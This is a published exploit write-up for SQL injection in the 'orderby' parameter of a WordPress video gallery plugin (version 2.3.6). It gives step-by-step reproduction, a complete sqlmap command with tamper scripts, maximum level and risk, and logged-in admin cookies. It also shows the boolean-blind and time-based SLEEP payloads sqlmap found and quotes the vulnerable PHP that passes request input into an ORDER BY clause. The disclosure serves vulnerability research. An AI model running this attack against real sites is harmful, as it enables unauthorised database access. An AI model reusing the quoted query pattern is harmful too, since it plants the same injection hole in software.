#### Exploit Title: Wordpress Video Gallery - YouTube Gallery and Vimeo Gallery Plugin SQL Injection 
#### Date: 2024-07-05
#### Exploit Author: tmrswrr
#### Category : Webapps
#### Vendor Homepage: https://total-soft.com/wp-video-gallery/
#### Version 2.3.6

1. **Access the Admin Panel:**
   - Navigate to the admin panel of your WordPress site.
   - Go to `TS Video Gallery > Create > Use Theme` and save it.

2. After saving, go back to TS Video Gallery and click the title: https://localhost/wordpress/wp-admin/admin.php?page=tsvg-admin&orderby=TS_VG_Title&order=asc

3. WordPress database error: [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\' desc LIMIT 15 OFFSET 0' at line 1]
SELECT `id`,`TS_VG_Title`,`TS_VG_Option`,`TS_VG_Sort`,`created_at` FROM wp_ts_galleryv_manager ORDER BY TS_VG_Title\\\' desc LIMIT 15 OFFSET 0

<img alt="Result" src="https://raw.githubusercontent.com/capture0x/Gallery-Plugin-SQL-Injection/main/9.png">

5. Search for the `orderby` parameter.

### SQLMAP COMMAND

```bash
python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=tsvg-admin&orderby=TS_VG_Title&order=desc" --batch --dbms=mysql --thread 10 --no-cast --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 -p orderby --cookie="wordpress_logged_in_d31d6d9d0bfd834c03c5a471886561f0=admin|1720346143|BXq7Kk6kWE6W8OhFfxRfE1vpFt00m9gRiPafjJPDU1N|0b78b25e2683d7f381967019db82b3f3fd9b06f1524ec128af92a74fe7c68e8f; \
wordpress_sec_d31d6d9d0bfd834c03c5a471886561f0=admin|1720346143|BXq7Kk6kWE6W8OhFfxRfE1vpFt00m9gRiPafjJPDU1N|307f68044e4c2632757b13f86f770ceda3c9c7866a0b595b33a7a2f675224a15; \
wordpress_test_cookie=WP Cookie check; \
wp-settings-time-1=1720173805" --thread 10
```

### RESULT

sqlmap identified the following injection point(s) with a total of 1026 HTTP(s) requests:
---
Parameter: orderby (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: page=tsvg-admin&orderby=(SELECT (CASE WHEN (1078=1078) THEN 0x54535f56475f5469746c65 ELSE (SELECT 2977 UNION SELECT 8545) END))&order=desc
    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=tsvg-admin&orderby=TS_VG_Title AND (SELECT 6127 FROM (SELECT(SLEEP(5)))mIWx)&order=desc
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[08:37:45] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[08:37:45] [INFO] the back-end DBMS is MySQL
[08:37:45] [PAYLOAD] (seLecT/**/(cAsE/**/WHen/**/(veRSIOn()/**/liKe/**/0x254d61726961444225)/**/ThEN/**/0x54535f56475f5469746c65/**/elSE/**/(seLecT/**/6685/**/UNiON/**/seLecT/**/9990)/**/End))
web application technology: Apache 2.4.54, PHP 8.0.23
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

<img alt="Result" src="https://raw.githubusercontent.com/capture0x/Gallery-Plugin-SQL-Injection/main/10.png">

# Vulnerable Code:
class-tsvg-list.php

public static function tsvg_get_galleries( $tsvg_per_page = 10, $tsvg_page_number = 1 ) {
		global $wpdb;
		$tsvg_get_result = $wpdb->get_results(
			$wpdb->prepare(
				'SELECT `id`,`TS_VG_Title`,`TS_VG_Option`,`TS_VG_Sort`,`created_at` FROM %1$s %2$s %3$s ORDER BY %4$s %5$s LIMIT %6$d OFFSET %7$d',
				esc_sql( $wpdb->prefix . 'ts_galleryv_manager' ),
				isset( $_REQUEST['s'] ) && ! empty( sanitize_text_field( $_REQUEST['s'] ) ) ? "WHERE TS_VG_Title like " : " ",
				isset( $_REQUEST['s'] ) && ! empty( sanitize_text_field( $_REQUEST['s'] ) ) ? '%' . $wpdb->esc_like( $_REQUEST['s'] ) . '%' : " ",
				isset( $_REQUEST['orderby'] ) && ! empty( sanitize_text_field( $_REQUEST['orderby'] ) ) ? sanitize_text_field( $_REQUEST['orderby'] ) : "id",
				isset( $_REQUEST['order'] ) && ! empty( sanitize_text_field($_REQUEST['order']) ) ? ' ' . sanitize_text_field( $_REQUEST['order'] ) : "ASC",
				(int) $tsvg_per_page,
				(int) ( $tsvg_page_number - 1 ) * $tsvg_per_page,
			),
			ARRAY_A
		);
		return $tsvg_get_result;
	}

